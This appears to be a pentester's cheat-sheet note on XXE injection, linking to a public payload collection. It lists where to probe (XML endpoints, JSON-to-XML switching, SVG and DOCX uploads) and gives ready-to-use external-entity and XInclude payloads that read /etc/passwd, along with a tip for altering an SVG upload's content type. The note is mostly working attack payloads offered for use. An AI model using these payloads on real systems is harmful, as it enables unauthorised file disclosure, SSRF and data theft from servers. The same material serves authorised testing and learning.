[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)


**Check:**

- XXE if an application references XML formatted data.
- If you think an endpoint is only accepting JSON, try to switch to XML and check if the application still accepts it.
- SVG uploads (try even if the form says png only)
- DOCX uploads

**Potential impact**

- View files on target server
- SSRF
- Exfiltrate Data

**Basic payload** - file inclusion

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (\#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

**Ensure you’re following the applications expected format**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```

**File Upload**
Intercept image upload, change content type header, and file extension to svg
```
Content-Type: image/svg+xml
```
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg)
![](../../../../assets/Pasted%20image%2020250629162451.png)

**Via XInclude**
Request is sending data in payload, we can potentially replace the data with XInclude to achieve file inclusion
Payload
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
![](../../../../assets/Pasted%20image%2020250629163247.png)